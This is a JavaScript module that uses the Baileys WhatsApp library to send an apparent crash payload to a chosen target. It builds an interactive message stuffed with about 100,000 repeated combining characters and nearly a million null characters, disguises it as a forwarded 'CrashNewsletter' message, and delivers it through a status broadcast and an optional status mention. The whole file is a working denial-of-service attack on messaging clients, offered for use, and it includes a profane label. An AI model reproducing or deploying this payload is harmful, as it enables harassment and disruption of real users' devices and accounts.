const chalk = require("chalk");
const crypto = require("crypto");
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

async function invishard2(target, mention) {
  console.log(chalk.red("Invisi hard sended"));
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "C U K I M A Y" + "ោ៝".repeat(99999),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "FUCK YOU" + "ោ៝".repeat(100000),
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "CrashNewsletter (💀)",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await RyuuBotz.sendMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await RyuuBotz.sendMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(10000) },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}

module.exports = invishard2